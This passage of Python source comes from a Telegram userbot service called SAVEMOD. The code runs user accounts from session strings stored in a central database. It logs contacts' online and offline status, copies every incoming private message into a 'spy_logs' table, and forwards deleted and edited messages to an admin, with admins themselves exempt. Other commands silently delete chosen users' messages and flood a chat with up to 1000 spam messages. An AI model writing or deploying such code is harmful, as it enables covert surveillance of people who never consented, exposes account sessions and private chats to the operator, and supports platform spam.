            if not hasattr(event, 'user') or event.user is None or event.user.id is None:
                return
            u = event.user
            if getattr(u, 'bot', False) or is_target_admin(u.id):
                return
            uid = u.id
            name = u.first_name or u.username or str(uid)
            cur = type(u.status).__name__
            last = user_status_tracker.get(owner_id, {}).get(uid)
            if cur != last:
                user_status_tracker[owner_id][uid] = cur
                if str(uid) in monitored_users:
                    try:
                        if isinstance(u.status, UserStatusOnline):
                            await bot.send_message(monitored_users[str(uid)]['admin_id'], f"🟢 {name} вошел в сеть!")
                        elif isinstance(u.status, UserStatusOffline):
                            await bot.send_message(monitored_users[str(uid)]['admin_id'], f"⚫ {name} вышел из сети!")
                    except:
                        pass
                if isinstance(u.status, UserStatusOnline):
                    st = "🟢 ВОШЕЛ В СЕТЬ"
                elif isinstance(u.status, UserStatusOffline):
                    st = "⚫ ВЫШЕЛ ИЗ СЕТИ"
                else:
                    return
                cursor.execute('INSERT INTO user_status_logs (timestamp, user_id, user_name, status) VALUES (?, ?, ?, ?)',
                               (datetime.now().isoformat(), uid, name[:100], st))
                conn.commit()
        except:
            pass
    
    @client.on(events.NewMessage)
    async def save_incoming(event):
        if event.out:
            return
        sid = event.sender_id
        
        # ПРОВЕРКА НА МУТ
        if sid in muted_users:
            await event.delete()
            logger.info(f"🗑 Удалено сообщение от заглушенного {sid}")
            return
        
        if is_target_admin(sid):
            return
        
        if event.text:
            saved_messages[owner_id][event.id] = {'sender_id': sid, 'text': event.text}
            cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                          (owner_id, event.id, sid, event.text, datetime.now().isoformat()))
            conn.commit()
            try:
                snd = await client.get_entity(sid)
                cursor.execute('INSERT INTO spy_logs (timestamp, sender_id, sender_name, message, chat_id, chat_name) VALUES (?, ?, ?, ?, ?, ?)',
                              (datetime.now().isoformat(), sid, snd.first_name or str(sid), event.text[:500], event.chat_id, 'private'))
                conn.commit()
            except:
                pass
    
    @client.on(events.MessageDeleted)
    async def notify_delete(event):
        if not event.is_private:
            return
        for mid in event.deleted_ids:
            msg = saved_messages.get(owner_id, {}).get(mid)
            if not msg:
                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
                row = cursor.fetchone()
                if row:
                    msg = {'sender_id': row[0], 'text': row[1]}
            if msg and msg['sender_id'] != owner_id and not is_target_admin(msg['sender_id']):
                try:
                    u = await client.get_entity(msg['sender_id'])
                    name = u.first_name or 'Пользователь'
                    uname = f"@{u.username}" if u.username else ''
                    await send_to_admin(f"🗑 <b>{name}</b> {uname} удалил сообщение:\n\n<blockquote>{msg['text'][:500]}</blockquote>")
                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
                    conn.commit()
                    if mid in saved_messages.get(owner_id, {}):
                        del saved_messages[owner_id][mid]
                except:
                    pass
    
    @client.on(events.MessageEdited)
    async def notify_edit(event):
        if not event.is_private or event.out:
            return
        mid = event.id
        ntxt = event.text or ''
        msg = saved_messages.get(owner_id, {}).get(mid)
        if not msg:
            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
            row = cursor.fetchone()
            if row:
                msg = {'sender_id': row[0], 'text': row[1]}
        if msg and msg['sender_id'] != owner_id and msg['text'] != ntxt and not is_target_admin(msg['sender_id']):
            try:
                u = await client.get_entity(msg['sender_id'])
                name = u.first_name or 'Пользователь'
                uname = f"@{u.username}" if u.username else ''
                await send_to_admin(f"✏️ <b>{name}</b> {uname} изменил сообщение:\n\n<b>Было:</b>\n<blockquote>{msg['text'][:200]}</blockquote>\n<b>Стало:</b>\n<blockquote>{ntxt[:200]}</blockquote>")
                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (ntxt, owner_id, mid))
                conn.commit()
                if mid in saved_messages.get(owner_id, {}):
                    saved_messages[owner_id][mid]['text'] = ntxt
            except:
                pass
    
    @client.on(events.NewMessage)
    async def user_commands(event):
        if not event.out:
            return
        txt = event.text or ''
        if not txt.startswith('.'):
            return
        
        if txt == '.help':
            await event.edit("""
🤖 КОМАНДЫ SAVEMOD

.help - справка
.mute (ответ) - заглушить
.unmute (ответ) - разглушить
.list - список заглушенных
.spam кол-во текст - спам
.type текст - печать
.info (ответ) - инфо
""")
            return
        
        if txt == '.mute':
            reply = await event.get_reply_message()
            if not reply:
                await event.edit('❌ Ответь на сообщение пользователя')
                return
            
            tid = reply.sender_id
            if not tid:
                await event.edit('❌ Не удалось определить пользователя')
                return
            
            if tid == owner_id:
                await event.edit('❌ Нельзя заглушить себя')
                return
            
            if is_target_admin(tid):
                await event.edit('❌ Нельзя заглушить администратора')
                return
            
            # Проверяем есть ли уже в муте
            cursor.execute('SELECT 1 FROM muted_users WHERE user_id=? AND muted_by=?', (tid, owner_id))
            if cursor.fetchone():
                await event.edit(f'🔇 Пользователь уже заглушен')
                return
            
            # Добавляем в мут
            cursor.execute('INSERT INTO muted_users (user_id, muted_by, muted_at) VALUES (?, ?, ?)',
                          (tid, owner_id, datetime.now().isoformat()))
            conn.commit()
            
            # Обновляем локальный список
            muted_users.add(tid)
            logger.info(f"🔇 Добавлен мут: {tid} от {owner_id}")
            
            try:
                u = await client.get_entity(tid)
                await event.edit(f'🔇 Пользователь {u.first_name} заглушен')
            except:
                await event.edit(f'🔇 Пользователь {tid} заглушен')
            return
        
        if txt == '.unmute':
            reply = await event.get_reply_message()
            if not reply:
                await event.edit('❌ Ответь на сообщение пользователя')
                return
            
            tid = reply.sender_id
            if not tid:
                await event.edit('❌ Не удалось определить пользователя')
                return
            
            if tid == owner_id:
                await event.edit('❌ Нельзя разглушить себя')
                return
            
            cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (tid, owner_id))
            conn.commit()
            
            if tid in muted_users:
                muted_users.discard(tid)
            logger.info(f"🔊 Удален мут: {tid} от {owner_id}")
            
            try:
                u = await client.get_entity(tid)
                await event.edit(f'🔊 Пользователь {u.first_name} разглушен')
            except:
                await event.edit(f'🔊 Пользователь разглушен')
            return
        
        if txt == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit("🔇 Заглушенные:\n" + "\n".join(names))
            else:
                await event.edit("🔇 Нет заглушенных")
            return
        
        if txt.startswith('.spam '):
            parts = txt.split(' ', 2)
            if len(parts) >= 2:
                try:
                    cnt = int(parts[1])
                    msg = parts[2] if len(parts) > 2 else None
                    if not msg:
                        reply = await event.get_reply_message()
                        if reply:
                            msg = reply.text
                    if msg and cnt > 0:
                        await event.delete()
                        for i in range(min(cnt, 1000)):
                            await client.send_message(event.chat_id, msg)
                            await asyncio.sleep(0.05)
                except:
                    pass
            return
        
        if txt.startswith('.type '):
            t = txt[6:]
            if t:
                await event.delete()
                m = await client.send_message(event.chat_id, t[0])
                typed = t[0]
                for ch in t[1:]:
                    typed += ch
                    try:
                        await m.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.15)
            return
        
        if txt == '.info':
            reply = await event.get_reply_message()
            if reply:
                try:
                    u = await client.get_entity(reply.sender_id)
                    if is_target_admin(u.id):
                        await event.edit("❌ Админ")
                        return
                    muted = "✅" if reply.sender_id in muted_users else "❌"
                    await event.edit(f"👤 {u.first_name}\n🆔 {u.id}\n🔇 Заглушен: {muted}")
                except:
                    pass
            else:
                await event.edit('❌ Ответь на сообщение')
            return
    
    await client.run_until_disconnected()

flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return jsonify({'status': 'ok', 'time': datetime.now().isoformat()})

def run_web():
    flask_app.run(host='0.0.0.0', port=8080, debug=False)

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    for uid, ss in cursor.fetchall():
        if not is_target_admin(uid):
            asyncio.create_task(run_userbot(uid, ss))

async def main():
    logger.info(f"🚀 SAVEMOD запущен. Админы: {ADMIN_IDS}")
    await restore_sessions()
    while True:
        await asyncio.sleep(60)

if __name__ == '__main__':
    Thread(target=run_web, daemon=True).start()
    executor.start_polling(dp, skip_updates=True)
    try:
        asyncio.run(main())
    except RuntimeError as e:
        if "event loop is already running" in str(e):
            loop = asyncio.get_event_loop()
            loop.create_task(main())
        else:
            raise
